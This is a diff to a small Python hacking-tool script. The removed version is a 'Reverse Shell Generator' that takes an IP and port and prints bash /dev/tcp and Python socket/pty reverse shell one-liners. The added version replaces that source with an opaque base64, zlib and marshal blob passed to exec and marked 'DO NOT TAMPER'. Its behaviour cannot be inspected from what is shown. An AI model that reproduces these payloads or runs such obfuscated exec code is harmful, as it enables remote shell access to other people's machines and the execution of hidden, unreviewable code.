@@ -1,21 +1,3 @@
-# CREATED BY: RAMIZ UDDIN
-import os, time
-
-def tool_header(name):
-    os.system("clear")
-    print("\033[1;36m" + "="*45)
-    print(f"      {name.upper()}")
-    print("      CREATED BY: RAMIZ UDDIN")
-    print("="*45 + "\033[0m")
-
-# CREATED BY: RAMIZ UDDIN
-def run():
-    while True:
-        print("\033[1;32m[*] ", end=""); print("\n\033[1;34m[*] Reverse Shell Generator\033[0m")
-        ip = input("\nEnter your IP (or '0' to exit): ")
-        if ip == '0': break
-        port = input("Enter your Port: ")
-        print("\033[1;32m[*] ", end=""); print(f"\n[ Bash ]\nbash -i >& /dev/tcp/{ip}/{port} 0>&1")
-        print("\033[1;32m[*] ", end=""); print(f"\n[ Python ]\npython -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'")
-        input("\n[Press Enter to Generate Another]")
-if __name__ == "__main__": run()
+# ENCRYPTED BY: RAMIZ UDDIN ULTIMATE OBFUSCATOR
+# SOURCE PROTECTED. DO NOT TAMPER.
+import marshal,zlib,base64;exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJyVVFtvG0UUnr057jqOoRekUBqmRqq9ketLnAC100hJkyIrxKTeuFzsaLOxB3tV70Wz65bsE+IFS7wEIYR4QOIVxDO/Y0WMVK38xgPiLaT8AGbWTuIolqqOtOeb+c5lZs45O3+BscGO8MUyEd8DGcjMJsBDZDAjs28CzMockVydl/nCJwCoYQDqXBwsjVwhaDEtRhL+oYtygxmLLpCPo9F/DaLXzhQVFlwacbLnEnMasyac8jI7keWqoDJ1OcrpqWZAfrIfP5EVztkWkEJlX2h0kIrdxZu1XDH/rn7/VYYbgsFwbw3xQWVjdWdjHa59WoCV1a3SZ7C6vl4qu7lXinqzltUl3mdN2w/ZB7aDdF+wsGY4vtC1LIQlxucNVUc2vQn0gR9xTLOjtJHaRBhHCMmTz14h4ksw4ENfl74q9Vp9/o0Bf8UT3+7zkEx6Dw8Xfyh8W/hu+TDtibf7fDzQSn1+Ppi89Sd/6wXNU2M86VOndT4J6jwHamddIJMekrl7LBznxmvAXa6BAapADgW9RpjWuM3UmQ3zkj3CVdID8pUqQ6SYH6vvS/wigd904Be94Hd+iplzdusZAFKs7EaCRlnQa/O7EItERcrBIaPpJsRAsxhoKugpwjaCcht1OvADZCCsOiampXVvixuGgzA8MLsYlrZh0sQwkU1Ax4ToC82RCtBnsu7rY0bbJnYK0J0Ta3BNtdtwV9yncFeDK3dgpomeZpyGlfGZjCvA7MqdnPuEWG4fOG3TILbWcHK3AROabpFQ0DYbT5CTMu2U5RwU7fvDdXoIydFq9aFSKm/spEZL+aMHm4q8Qzp8Syra6YZpGKjhJJNxl42n3LokFU073exaC0k7/bnWQYaZlFLZiWxuIrsgFclp0ralPjOS8cy+ZmToLeNSwo2LtW2MbBsOc0ISNcoogquG6bQR3pVYTJvTFzTD6joS67Oa5fP0tjZ9guCwVj6Huwa+TmbT9Bf5PfhFnoszg3DUm5n7ee2PcOK3G15G6Ut7g+hV79p7R9H3e+zzSPTw2jf3DtEgdt27kTyKST3+okfukVfZ8R5Vvepj7+Oa97ju1VUvs9+XGhfsjgFY2GOJVNkGhT22SaHJtii02Q6FFqtT0NlNnkD2Q/4/AOa3hhvm++HFf2MgEsP0/H5YUXRVMxRFEjB94nze0XQUPAHBJakBfSkU5RcQeAyTEF7WzWa3g1bwLFnSDrffIeKYYxjmbxA74QVm7uS1MLN0fBXw0z33iJv9Mf/TksfNBkH+B4RTZwI='))))
